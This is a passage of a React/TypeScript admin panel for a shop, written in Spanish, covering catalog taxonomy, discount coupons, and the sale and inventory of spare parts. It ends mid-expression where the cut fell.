function CatalogosAdmin({ categorias, tipos, marcas, equipos, reload, notify, go }: {
  categorias: Option[]; tipos: Option[]; marcas: Option[]; equipos: Equipo[]
  reload: () => void; notify: Notify; go: (s: Section) => void
}) {
  const [activeIdx, setActiveIdx] = useState(0)
  const [verSinClasificar, setVerSinClasificar] = useState(false)
  // Conteo de uso por producto para cada etiqueta
  const count = (pick: (e: Equipo) => number | undefined) => {
    const m = new Map<number, number>()
    equipos.forEach(e => { const id = pick(e); if (id != null) m.set(id, (m.get(id) || 0) + 1) })
    return m
  }
  const usoCat = count(e => e.categoria?.id)
  const usoTipo = count(e => e.tipo?.id)
  const usoMarca = count(e => e.marca?.id)

  const blocks = [
    { title: 'Categorías', singular: 'categoría', endpoint: '/categorias/', data: categorias, uso: usoCat, accent: 'text-gold-ink bg-gold-soft', icon: <path d="M4 4h7v7H4zM13 4h7v7h-7zM13 13h7v7h-7zM4 13h7v7H4z" /> },
    { title: 'Tipos', singular: 'tipo', endpoint: '/tipos/', data: tipos, uso: usoTipo, accent: 'text-blue-500 bg-blue-500/10', icon: <path d="M7 7h10M7 12h10M7 17h6M4 4h16v16H4z" /> },
    { title: 'Marcas', singular: 'marca', endpoint: '/marcas/', data: marcas, uso: usoMarca, accent: 'text-violet-500 bg-violet-500/10', icon: <path d="M9 5H7a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" /> },
  ]
  // Productos incompletos + qué etiqueta les falta a cada uno (para poder actuar).
  const sinClasificarList = equipos
    .filter(e => !e.categoria || !e.tipo || !e.marca)
    .map(e => ({
      e,
      faltan: [!e.categoria && 'Categoría', !e.tipo && 'Tipo', !e.marca && 'Marca'].filter(Boolean) as string[],
    }))
  const sinClasificar = sinClasificarList.length

  return (
    <div className="space-y-4">
      {/* Encabezado */}
      <div className="flex flex-col sm:flex-row sm:items-start sm:justify-between gap-3">
        <div>
          <p className="text-gold-ink text-[12px] font-bold tracking-wide mb-2">— TAXONOMÍA DEL CATÁLOGO</p>
          <p className="text-[15px] text-mute max-w-2xl leading-relaxed">
            Organiza tus productos en <b className="text-ink">categorías</b>, <b className="text-ink">tipos</b> y <b className="text-ink">marcas</b>. Cada etiqueta muestra cuántos productos la usan.
          </p>
        </div>
        {sinClasificar > 0 && (
          <button onClick={() => setVerSinClasificar(v => !v)} title="Ver cuáles son"
            className="shrink-0 inline-flex items-center gap-2 px-4 py-2 rounded-[9px] text-[13px] font-bold hover:brightness-95 transition-[filter]" style={{ background: '#FBEBD9', color: '#B8681C' }}>
            <span className="w-[7px] h-[7px] rounded-full" style={{ background: '#B8681C' }} />
            {sinClasificar} producto{sinClasificar > 1 ? 's' : ''} sin clasificar
            <svg className={`w-3.5 h-3.5 transition-transform ${verSinClasificar ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.5"><path strokeLinecap="round" strokeLinejoin="round" d="M6 9l6 6 6-6" /></svg>
          </button>
        )}
      </div>

      {/* Detalle: qué productos están sin clasificar y qué les falta */}
      {sinClasificar > 0 && verSinClasificar && (
        <div className="rounded-xl border overflow-hidden" style={{ borderColor: '#F0D6B8' }}>
          <div className="flex items-center justify-between gap-3 px-4 py-3 border-b" style={{ background: '#FBEBD9', borderColor: '#F0D6B8' }}>
            <p className="text-[13px] font-bold" style={{ color: '#B8681C' }}>Productos sin clasificar ({sinClasificar})</p>
            <button onClick={() => go('equipos')} className="shrink-0 inline-flex items-center gap-1.5 px-3 h-8 rounded-lg bg-gold text-black text-xs font-bold hover:brightness-95 transition-[filter]">
              Ir a Productos
              <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.5"><path strokeLinecap="round" strokeLinejoin="round" d="M9 5l7 7-7 7" /></svg>
            </button>
          </div>
          <div className="divide-y divide-edge max-h-64 overflow-y-auto bg-surface">
            {sinClasificarList.map(({ e, faltan }) => (
              <div key={e.id} className="flex items-center justify-between gap-3 px-4 py-2.5">
                <p className="text-sm text-ink truncate">{e.modelo || `Producto #${e.id}`}</p>
                <div className="flex items-center gap-1.5 shrink-0">
                  {faltan.map(f => (
                    <span key={f} className="text-[10px] font-bold uppercase px-2 py-0.5 rounded-md" style={{ background: '#FBEBD9', color: '#B8681C' }}>
                      Falta {f}
                    </span>
                  ))}
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      <div className="grid grid-cols-1 lg:grid-cols-[260px_1fr] gap-2.5 items-start">
        {/* Selector de columna */}
        <div className="flex lg:flex-col gap-1 overflow-x-auto">
          {blocks.map((b, i) => (
            <button key={b.endpoint} onClick={() => setActiveIdx(i)} className={`flex items-center gap-2.5 p-4 rounded-xl border text-left transition-colors shrink-0 lg:shrink ${i === activeIdx ? 'bg-surface border-gold/40 shadow-[0_1px_3px_rgba(33,29,22,0.04)]' : 'bg-surface border-edge hover:border-gold/25'}`}>
              <span className={`w-[34px] h-[34px] rounded-[9px] flex items-center justify-center shrink-0 ${b.accent}`}>
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.7">{b.icon}</svg>
              </span>
              <div className="flex-1 min-w-0">
                <div className="text-[14.5px] font-extrabold text-ink whitespace-nowrap">{b.title}</div>
                <div className="text-[12.5px] text-mute mt-0.5 whitespace-nowrap">{b.data.length} etiquetas</div>
              </div>
              {i === activeIdx && <span className="w-[7px] h-[7px] rounded-full bg-gold shrink-0" />}
            </button>
          ))}
          {sinClasificar > 0 && (
            <button onClick={() => setVerSinClasificar(true)} title="Ver cuáles son"
              className="hidden lg:block text-left mt-2 p-4 rounded-xl text-[13px] font-semibold leading-snug hover:brightness-95 transition-[filter]" style={{ background: '#FBEBD9', color: '#B8681C' }}>
              <div className="flex items-center gap-1.5 font-bold mb-1"><span className="w-[7px] h-[7px] rounded-full" style={{ background: '#B8681C' }} />Sin clasificar</div>
              {sinClasificar} producto{sinClasificar > 1 ? 's' : ''} aún sin categoría, tipo o marca. <span className="underline">Ver cuáles →</span>
            </button>
          )}
        </div>

        {/* Panel de detalle */}
        <div className="min-w-0">
          <CatalogBlock key={blocks[activeIdx].endpoint} {...blocks[activeIdx]} reload={reload} notify={notify} />
        </div>
      </div>
    </div>
  )
}

function CatalogBlock({ title, singular, endpoint, data, uso, accent, icon, reload, notify }: {
  title: string; singular: string; endpoint: string; data: Option[]; uso: Map<number, number>; accent: string; icon: React.ReactNode
  reload: () => void; notify: Notify
}) {
  const [nombre, setNombre] = useState('')
  const [search, setSearch] = useState('')
  const [busy, setBusy] = useState(false)
  const [editId, setEditId] = useState<number | null>(null)
  const [editVal, setEditVal] = useState('')

  const visibles = data.filter(o => !search.trim() || o.nombre.toLowerCase().includes(search.trim().toLowerCase()))
  const cap = (s: string) => s[0].toUpperCase() + s.slice(1)

  function add() {
    const v = nombre.trim()
    if (!v) return
    setBusy(true)
    api.post(endpoint, { nombre: v })
      .then(() => { notify(`${cap(singular)} agregada`); setNombre(''); reload() })
      .catch(err => notify(err?.response?.data?.nombre?.[0] || 'Error al agregar', 'err'))
      .finally(() => setBusy(false))
  }

  function guardarRename(id: number) {
    const v = editVal.trim()
    if (!v) { setEditId(null); return }
    api.patch(`${endpoint}${id}/`, { nombre: v })
      .then(() => { notify('Renombrado'); setEditId(null); reload() })
      .catch(err => notify(err?.response?.data?.nombre?.[0] || 'Error al renombrar', 'err'))
  }

  async function del(o: Option) {
    const n = uso.get(o.id) || 0
    if (n > 0) { notify(`"${o.nombre}" está en uso por ${n} producto${n > 1 ? 's' : ''}`, 'err'); return }
    if (!await confirmar({ titulo: `¿Eliminar "${o.nombre}"?`, aceptar: 'Eliminar', tono: 'peligro' })) return
    api.delete(`${endpoint}${o.id}/`)
      .then(() => { notify('Eliminado', 'neutro'); reload() })
      .catch(err => notify(err?.response?.data?.detail || 'No se puede eliminar (en uso)', 'err'))
  }

  return (
    <Card className="overflow-hidden flex flex-col">
      {/* Header */}
      <div className="px-5 py-4 border-b border-edge flex items-center gap-3">
        <span className={`w-9 h-9 rounded-lg flex items-center justify-center shrink-0 ${accent}`}>
          <svg className="w-[18px] h-[18px]" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.7">{icon}</svg>
        </span>
        <h2 className="font-bold text-ink flex-1">{title}</h2>
        <span className="text-xs font-bold px-2 py-1 rounded-md bg-surface-2 text-mute tabular-nums">{data.length}</span>
      </div>

      <div className="p-5 space-y-3">
        {/* Agregar */}
        <div className="flex gap-2">
          <input aria-label="Nombre" className={input} value={nombre} onChange={e => setNombre(e.target.value)} onKeyDown={e => e.key === 'Enter' && add()} placeholder={`Nueva ${singular}`} />
          <button onClick={add} disabled={busy}
            className="shrink-0 w-10 h-[42px] rounded-xl bg-gold text-black font-black hover:opacity-90 active:scale-[0.96] transition-[transform,opacity] duration-150 ease-[cubic-bezier(0.23,1,0.32,1)] disabled:opacity-50 flex items-center justify-center">
            {busy ? <span className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" /> : '+'}
          </button>
        </div>
        {/* Buscar (si hay muchas) */}
        {data.length > 6 && (
          <input aria-label="Buscar" className={`${input} text-xs`} value={search} onChange={e => setSearch(e.target.value)} placeholder={`Filtrar ${title.toLowerCase()}…`} />
        )}
      </div>

      {/* Lista */}
      <div className="px-5 pb-5 grid grid-cols-1 sm:grid-cols-2 gap-1.5 max-h-[440px] overflow-y-auto">
        {visibles.map((o, i) => {
          const n = uso.get(o.id) || 0
          return (
            <div key={o.id} style={{ animationDelay: `${Math.min(i, 8) * 35}ms` }}
              className="stagger-item relative flex items-center gap-2 px-3.5 py-3 rounded-[10px] border border-edge hover:bg-surface-2 hover:border-gold/25 transition-colors duration-150 group">
              {editId === o.id ? (
                <>
                  <input aria-label="Nuevo nombre" autoFocus className="flex-1 bg-surface-2 border border-gold/40 rounded-md px-2 py-1 text-sm text-ink focus:outline-none"
                    value={editVal} onChange={e => setEditVal(e.target.value)}
                    onKeyDown={e => { if (e.key === 'Enter') guardarRename(o.id); if (e.key === 'Escape') setEditId(null) }} />
                  <button onClick={() => guardarRename(o.id)} className="text-emerald-500 hover:opacity-80 active:scale-90 transition-transform duration-100 p-1"><svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.5"><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg></button>
                  <button onClick={() => setEditId(null)} className="text-mute hover:text-ink active:scale-90 transition-transform duration-100 p-1"><svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" d="M6 6l12 12M18 6L6 18" /></svg></button>
                </>
              ) : (
                <>
                  <span className="flex-1 text-sm text-ink truncate">{o.nombre}</span>
                  {/* Conteo de uso (oculto en hover para dar espacio a acciones) */}
                  <span className={`text-[11px] font-mono tabular-nums shrink-0 transition-opacity duration-150 group-hover:opacity-0 ${n > 0 ? 'text-mute' : 'text-mute/50'}`}>
                    {n} prod.
                  </span>
                  <div className="flex items-center absolute right-5 opacity-0 group-hover:opacity-100 transition-opacity duration-150">
                    <button onClick={() => { setEditId(o.id); setEditVal(o.nombre) }} title="Renombrar" className="text-mute hover:text-gold-ink active:scale-90 transition-transform duration-100 p-1">
                      <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8"><path strokeLinecap="round" strokeLinejoin="round" d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7M18.5 2.5a2.12 2.12 0 013 3L12 15l-4 1 1-4 9.5-9.5z" /></svg>
                    </button>
                    <button onClick={() => del(o)} title={n > 0 ? `En uso (${n})` : 'Eliminar'} className={`active:scale-90 transition-transform duration-100 p-1 ${n > 0 ? 'text-mute/40 cursor-not-allowed' : 'text-mute hover:text-red-400'}`}>
                      <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" strokeLinejoin="round" d="M3 6h18M8 6V4a1 1 0 011-1h6a1 1 0 011 1v2m2 0v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6" /></svg>
                    </button>
                  </div>
                </>
              )}
            </div>
          )
        })}
        {visibles.length === 0 && <p className="text-xs text-mute py-6 text-center">{search ? 'Sin coincidencias' : 'Vacío — agrega la primera ↑'}</p>}
      </div>
    </Card>
  )
}

/* ════════════════════════════════════════
   CUPONES CRUD
════════════════════════════════════════ */
function CuponesAdmin({ coupons, reload, notify, cargando }: {
  coupons: Coupon[]; reload: () => void; notify: Notify; cargando?: boolean
}) {
  const [codigo, setCodigo] = useState('')
  const [percent, setPercent] = useState('')
  /* Opcional a propósito: una promoción de temporada tiene fecha de fin, pero
     un código permanente de la empresa no, y obligar a poner una haría que se
     tecleara cualquier cosa. Vacío = no vence, y se apaga con `activo`. */
  const [vence, setVence] = useState('')
  const [busy, setBusy] = useState(false)

  function add() {
    const code = codigo.trim()
    const pct = Math.max(0, Math.min(100, Number(percent) || 0))
    if (!code) { notify('Código obligatorio', 'err'); return }
    setBusy(true)
    /* Hasta el FINAL del día elegido: quien pone "vence el 31 de diciembre"
       quiere que sirva ese 31, no que muera a la medianoche que lo estrena. */
    api.post('/cupones/', {
      codigo: code, descuento: pct / 100, activo: true,
      expira: vence ? `${vence}T23:59:59` : null,
    })
      .then(() => { notify('Cupón creado'); setCodigo(''); setPercent(''); setVence(''); reload() })
      .catch(err => notify(err?.response?.data?.codigo?.[0] || 'Error al crear', 'err'))
      .finally(() => setBusy(false))
  }

  async function del(id?: number) {
    if (!id || !await confirmar({ titulo: '¿Eliminar cupón?', aceptar: 'Eliminar', tono: 'peligro' })) return
    api.delete(`/cupones/${id}/`).then(() => { notify('Cupón eliminado', 'neutro'); reload() }).catch(() => notify('Error', 'err'))
  }

  return (
    <div className="grid lg:grid-cols-3 gap-6">
      <Card className="p-6 h-fit">
        <h2 className="font-bold text-ink mb-5">Nuevo cupón</h2>
        <div className="space-y-4">
          <div>
            <label className={label}>Código</label>
            <input aria-label="Código" className={input} value={codigo} onChange={e => setCodigo(e.target.value.toUpperCase())} placeholder="VERANO2026" />
          </div>
          <div>
            <label className={label}>Descuento (%)</label>
            <input aria-label="Descuento (%)" type="number" min={0} max={100} className={input} value={percent} onChange={e => setPercent(e.target.value)} placeholder="15" />
          </div>
          <div>
            <label className={label}>Vence (opcional)</label>
            <input aria-label="Vence" type="date" className={input} value={vence} onChange={e => setVence(e.target.value)} />
            <p className="mt-1.5 text-xs text-mute">Vacío = no vence. El de bienvenida dura 3 meses y lo pone el sistema.</p>
          </div>
          <button onClick={add} disabled={busy}
            className="w-full py-3 rounded-full bg-gold text-black font-bold text-sm hover:opacity-90 transition-colors disabled:opacity-50">
            Crear cupón
          </button>
        </div>
      </Card>

      <div className="lg:col-span-2">
        <Card className="overflow-hidden">
          <div className="px-6 py-4 border-b border-edge">
            <h2 className="font-bold text-ink">Cupones <span className="text-mute font-normal">({coupons.length})</span></h2>
          </div>
          <div className="divide-y divide-edge">
            {coupons.map(c => (
              <div key={c.id} className="flex items-center justify-between px-6 py-4 hover:bg-surface-2 transition-colors group">
                <div className="flex items-center gap-4">
                  <span className="px-3 py-1.5 rounded-lg bg-gold-soft text-gold-ink font-mono font-bold text-sm">{c.codigo}</span>
                  <span className="text-sm text-mute">{Math.round((c.descuento || 0) * 100)}% descuento</span>
                  {c.activo === false && <span className="text-xs text-mute">(inactivo)</span>}
                  {c.expira && (
                    /* Vencido en rojo y no como un "(inactivo)" más: para el
                       admin son cosas distintas —uno lo apagó él, el otro se
                       apagó solo— y de eso depende si tiene algo que arreglar. */
                    <span className={`text-xs ${new Date(c.expira) <= new Date() ? 'text-red-400' : 'text-mute'}`}>
                      {new Date(c.expira) <= new Date() ? 'venció' : 'vence'} {new Date(c.expira).toLocaleDateString('es-MX', { day: '2-digit', month: 'short', year: 'numeric' })}
                    </span>
                  )}
                </div>
                <button onClick={() => del(c.id)} className="px-3 py-1.5 rounded-lg border border-red-500/20 text-xs text-red-400 hover:bg-red-500/10 opacity-0 group-hover:opacity-100 transition-all">Eliminar</button>
              </div>
            ))}
            {coupons.length === 0 && (cargando ? <FilasEsqueleto filas={3} columnas={2} /> : (
              <EstadoVacio
                titulo="Sin cupones"
                mensaje="Un cupón es un código con descuento que el cliente escribe al comprar en la tienda."
                icono={<><path d="M3 9V7a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v2a2 2 0 0 0 0 4v2a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-2a2 2 0 0 0 0-4z" /><path d="M9 9.5h.01M15 14.5h.01M15 9l-6 6" /></>}
              />
            ))}
          </div>
        </Card>
      </div>
    </div>
  )
}

/* ════════════════════════════════════════
   REFACCIONES
════════════════════════════════════════ */
function VenderRefaccionModal({ refaccion, notify, onClose, onSold }: {
  refaccion: Refaccion; notify: Notify; onClose: () => void; onSold: (ventaId: number) => void
}) {
  const [cant, setCant] = useState('1')
  const [cliente, setCliente] = useState('')
  const [metodo, setMetodo] = useState<'efectivo' | 'tarjeta' | 'transferencia'>('efectivo')
  const [requiereFactura, setRequiereFactura] = useState(false)
  const [factura, setFactura] = useState<FacturaData>(FACTURA_VACIA)
  const [busy, setBusy] = useState(false)
  const cantN = Math.max(1, Number(cant) || 1)
  // El precio de la refacción YA INCLUYE IVA (es el precio al público). El backend
  // desglosa el total en Venta.recalcular_total(); aquí solo lo espejeamos para que
  // el mostrador cobre exactamente lo que se va a registrar.
  const total = (Number(refaccion.precio_venta) || 0) * cantN
  const baseRef = Math.round((total / 1.16) * 100) / 100
  const ivaRef = Math.round((total - baseRef) * 100) / 100

  function submit() {
    if (cantN > refaccion.stock) { notify(`Solo hay ${refaccion.stock} en stock`, 'err'); return }
    const errFactura = validarFactura(requiereFactura, '', factura)
    if (errFactura) { notify(errFactura, 'err'); return }
    setBusy(true)
    api.post('/ventas/mostrador/', { nombre_cliente: cliente.trim(), metodo_pago: metodo, items: [{ refaccion_id: refaccion.id, cantidad: cantN }], requiere_factura: requiereFactura, factura })
      .then(res => { notify('Venta registrada'); const id = res.data?.venta?.id; if (id) onSold(id); else onClose() })
      .catch(err => notify(err?.response?.data?.detalle || 'Error al vender', 'err'))
      .finally(() => setBusy(false))
  }

  return (
    <Modal className="modal-in fixed inset-0 z-[70] bg-black/70 backdrop-blur-sm flex items-center justify-center p-6" onClose={onClose} label="Vender refacción">
      <div onClick={e => e.stopPropagation()} className="bg-surface border border-edge rounded-3xl p-6 max-w-sm w-full shadow-[0_20px_50px_rgba(33,29,22,0.18)]">
        <h3 className="font-black text-ink mb-1">Vender refacción</h3>
        <p className="text-xs text-mute mb-5">{refaccion.nombre} · stock {refaccion.stock} · <span className="font-mono">{refaccion.codigo_barras}</span></p>
        <div className="space-y-3">
          <div><label className={label}>Cantidad</label><input aria-label="Cantidad" type="number" min={1} max={refaccion.stock} className={input} value={cant} onChange={e => setCant(e.target.value)} /></div>
          <div><label className={label}>Cliente (opcional)</label><input aria-label="Cliente (opcional)" className={input} value={cliente} onChange={e => setCliente(e.target.value)} placeholder="Nombre del comprador" /></div>
          <div>
            <label className={label}>Método de pago</label>
            <select aria-label="Método de pago" className={input} value={metodo} onChange={e => setMetodo(e.target.value as any)}>
              <option value="efectivo" className="bg-surface">Efectivo</option>
              <option value="tarjeta" className="bg-surface">Tarjeta</option>
              <option value="transferencia" className="bg-surface">Transferencia</option>
            </select>
          </div>
          <div className="px-4 py-3 rounded-xl bg-surface-2 space-y-1">
            <div className="flex items-center justify-between text-xs text-mute"><span>Subtotal (sin IVA)</span><span>${baseRef.toLocaleString('en-US', { minimumFractionDigits: 2 })}</span></div>
            <div className="flex items-center justify-between text-xs text-mute"><span>IVA (16%)</span><span>${ivaRef.toLocaleString('en-US', { minimumFractionDigits: 2 })}</span></div>
            <div className="flex items-center justify-between pt-1 border-t border-edge"><span className="text-sm text-ink font-semibold">Total a cobrar</span><span className="text-lg font-black text-price">${total.toLocaleString('en-US', { minimumFractionDigits: 2 })}</span></div>
          </div>
          <FacturaFields requiere={requiereFactura} onRequiere={setRequiereFactura} factura={factura} onFactura={setFactura} />
        </div>
        <div className="flex gap-2 mt-6">
          <button onClick={onClose} className="flex-1 py-2.5 rounded-full border border-edge text-mute text-sm font-medium hover:text-ink transition-colors">Cancelar</button>
          <button onClick={submit} disabled={busy} className="flex-1 py-2.5 rounded-full bg-gold text-black text-sm font-bold hover:opacity-90 transition-opacity disabled:opacity-50">Registrar venta</button>
        </div>
      </div>
    </Modal>
  )
}

function RefaccionesAdmin({ refacciones, reload, notify, cargando }: {
  refacciones: Refaccion[]; reload: () => void; notify: Notify; cargando?: boolean
}) {
  const puede = usePuede()
  const empty = { nombre: '', descripcion: '', precio_venta: '', stock: '0', stock_minimo: '0', para_venta: true, ubicacion: '', codigo_barras: '' }
  const [q, setQ] = useState('')
  const [formOpen, setFormOpen] = useState(false)
  const [editing, setEditing] = useState<Refaccion | null>(null)
  const [saving, setSaving] = useState(false)
  const [form, setForm] = useState<any>(empty)
  const [labelRef, setLabelRef] = useState<Refaccion | null>(null)
  const [sellRef, setSellRef] = useState<Refaccion | null>(null)
  const [ticketVentaId, setTicketVentaId] = useState<number | null>(null)

  const filtradas = refacciones.filter(r => {
    const t = q.trim().toLowerCase()
    if (!t) return true
    return `${r.nombre} ${r.codigo_barras} ${r.descripcion || ''}`.toLowerCase().includes(t)
  })
  // El catálogo de refacciones crece con los años y nadie da de baja un filtro:
  // la tabla se pagina y los indicadores de arriba siguen mirando el total.
  const { enPantalla, ancla, props: pagProps } = usePaginado(filtradas, undefined, [q])
  const bajoStock = refacciones.filter(r => r.bajo_stock).length
  const paraVenta = refacciones.filter(r => r.para_venta).length
  const valorInv = refacciones.reduce((a, r) => a + num(r.precio_venta) * num(r.stock), 0)

  function openNew() { setEditing(null); setForm(empty); setFormOpen(true) }
  function openEdit(r: Refaccion) {
    setEditing(r)
    setForm({ nombre: r.nombre, descripcion: r.descripcion || '', precio_venta: r.precio_venta, stock: String(r.stock), stock_minimo: String(r.stock_minimo), para_venta: r.para_venta, ubicacion: r.ubicacion || '', codigo_barras: r.codigo_barras || '' })
    setFormOpen(true)
  }

  function save() {
    if (!form.nombre.trim()) { notify('El nombre es obligatorio', 'err'); return }
    setSaving(true)
    const payload = {
      nombre: form.nombre.trim(), descripcion: (form.descripcion || '').trim(),
      precio_venta: num(form.precio_venta), stock: num(form.stock), stock_minimo: num(form.stock_minimo),
      para_venta: true, ubicacion: (form.ubicacion || '').trim(),   // todas las refacciones se venden al público (caja)
      codigo_barras: (form.codigo_barras || '').trim(),
    }
    const req = editing ? api.patch(`/refacciones/${editing.id}/`, payload) : api.post('/refacciones/', payload)
    req.then(() => { notify(editing ? 'Refacción actualizada' : 'Refacción agregada'); setFormOpen(false); reload() })
      .catch(err => notify(err?.response?.data?.codigo_barras?.[0] || err?.response?.data?.detalle || 'Error al guardar', 'err'))
      .finally(() => setSaving(false))
  }

  async function del(r: Refaccion) {
    if (!await confirmar({ titulo: `¿Eliminar "${r.nombre}"?`, aceptar: 'Eliminar', tono: 'peligro' })) return
    api.delete(`/refacciones/${r.id}/`)
      .then(() => { notify('Refacción eliminada', 'neutro'); reload() })
      .catch(err => notify(err?.response?.data?.detail || 'No se pudo eliminar (¿en una venta?)', 'err'))
  }

  return (
    <div className="space-y-4">
      <KpiGrid
        items={[
          { label: 'Refacciones', value: refacciones.length, tone: 'default', helper: 'piezas distintas dadas de alta', icon: <><path d="M14.7 6.3a4 4 0 0 0-5.6 5.6L3 18v3h3l6.1-6.1a4 4 0 0 0 5.6-5.6l-2.5 2.5-2.1-2.1z" /></> },
          {
            label: 'Bajo stock', value: bajoStock, tone: 'danger', emphasis: bajoStock > 0,
            helper: bajoStock ? 'pide antes de quedarte sin la pieza' : 'ninguna en el mínimo',
            icon: <><path d="M10.3 4.3 2.6 18a2 2 0 0 0 1.7 3h15.4a2 2 0 0 0 1.7-3L13.7 4.3a2 2 0 0 0-3.4 0z" /><path d="M12 9v4m0 4h.01" /></>,
          },
          { label: 'Para venta', value: paraVenta, tone: 'gold', helper: 'se pueden cobrar en la caja', icon: <><path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z" /><path d="M3 6h18" /><path d="M16 10a4 4 0 0 1-8 0" /></> },
          { label: 'Valor inventario', value: <Monto valor={valorInv} />, tone: 'default', helper: 'a precio de costo', icon: <><path d="M12 1v22" /><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" /></> },
        ]}
      />

      <Card ref={ancla} className="overflow-hidden scroll-mt-24">
        <CardBarra titulo="Refacciones" cuenta={filtradas.length}>
          <div className="relative w-full sm:w-64">
            <svg className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-mute pointer-events-none" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><circle cx="9" cy="9" r="6" /><path d="M15 15l3 3" strokeLinecap="round" /></svg>
            <input aria-label="Buscar nombre o código" value={q} onChange={e => setQ(e.target.value)} placeholder="Buscar nombre o código…" className="campo campo-sm pl-10" />
          </div>
          <button onClick={openNew} className="btn-acento shrink-0 inline-flex items-center gap-2 h-10 px-4 rounded-full text-[13.5px] font-bold">
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.2"><path strokeLinecap="round" d="M12 5v14M5 12h14" /></svg>
            <span className="hidden sm:inline">Nueva refacción</span>
          </button>
        </CardBarra>

        <div className="overflow-x-auto">
          <table className="tabla-panel w-full min-w-[760px] text-left">
            <thead>
              <tr className="text-[10px] uppercase tracking-wider text-mute border-b border-edge">
                <th className="font-semibold px-5 py-3">Refacción</th>
                <th className="font-semibold px-3 py-3">Código de barras</th>
                <th className="font-semibold px-3 py-3">Precio</th>
                <th className="font-semibold px-3 py-3">Stock</th>
                <th className="font-semibold px-5 py-3 text-right">Acciones</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-edge">
              {enPantalla.map(r => (
                <tr key={r.id} className="hover:bg-surface-2 transition-colors">
                  <td className="px-5 py-3">
                    <p className="text-sm font-semibold text-ink">{r.nombre}</p>
                    {r.ubicacion && <p className="text-[11px] text-mute">{r.ubicacion}</p>}
                  </td>
                  <td data-col="Código" className="px-3 py-3 font-mono text-[13px] text-mute whitespace-nowrap"><span>{r.codigo_barras}</span></td>
                  <td data-col="Precio" className="px-3 py-3 text-sm font-bold text-price whitespace-nowrap"><span>${num(r.precio_venta).toLocaleString('en-US', { minimumFractionDigits: 2 })}</span></td>
                  <td data-col="Stock" className="px-3 py-3 whitespace-nowrap">
                    <div>
                      <span className={`text-sm font-bold ${r.bajo_stock ? 'text-red-500' : 'text-ink'}`}>{r.stock}</span>
                      {r.bajo_stock && <span className="ml-2 text-[10px] font-bold uppercase text-red-500 bg-red-500/10 px-1.5 py-0.5 rounded">Bajo</span>}
                    </div>
                  </td>
                  <td className="px-5 py-3 text-right">
                    <div className="flex flex-wrap items-center justify-end gap-2">
                      <button onClick={() => (r.stock > 0 ? setSellRef(r) : notify('Sin stock', 'err'))} title="Vender al público" className="h-8 px-3 rounded-lg border border-emerald-500/30 text-emerald-500 text-xs font-semibold hover:bg-emerald-500/10 transition-colors flex items-center gap-1.5">
                        <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.7"><rect x="3" y="7" width="18" height="10" rx="2" /><circle cx="12" cy="12" r="2.2" /></svg>
                        Vender
                      </button>
                      <button onClick={() => setLabelRef(r)} title="Imprimir etiqueta de código de barras" className="w-8 h-8 rounded-lg border border-edge text-mute hover:text-gold-ink hover:border-gold/40 transition-colors flex items-center justify-center">
                        <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.7" strokeLinecap="round"><path d="M4 7v10M7 7v10M9.5 7v10M12.5 7v10M15 7v10M17.5 7v10M20 7v10" /></svg>
                      </button>
                      <button onClick={() => openEdit(r)} title="Editar" className="w-8 h-8 rounded-lg border border-edge text-mute hover:text-ink hover:border-gold/40 transition-colors flex items-center justify-center">
                        <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8"><path strokeLinecap="round" strokeLinejoin="round" d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7M18.5 2.5a2.12 2.12 0 013 3L12 15l-4 1 1-4 9.5-9.5z" /></svg>
                      </button>
                      {/* Borrar es del DUEÑO: quitar una máquina del sistema es como se encubre
                          una que falta. El backend lo rechaza igual; esconderlo aquí evita
                          ofrecer un botón que va a fallar. */}
                      {puede('borrar_catalogo') && (
                      <button onClick={() => del(r)} title="Eliminar" className="w-8 h-8 rounded-lg border border-red-500/20 text-red-400 hover:bg-red-500/10 transition-colors flex items-center justify-center">
                        <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" strokeLinejoin="round" d="M3 6h18M8 6V4a1 1 0 011-1h6a1 1 0 011 1v2m2 0v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6" /></svg>
                      </button>
                      )}
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
          {filtradas.length === 0 && (cargando ? <FilasEsqueleto filas={6} columnas={4} /> : (
            <EstadoVacio
              titulo={q ? 'Sin resultados' : 'Sin refacciones'}
              mensaje={q
                ? 'Busca por nombre, número de parte o marca.'
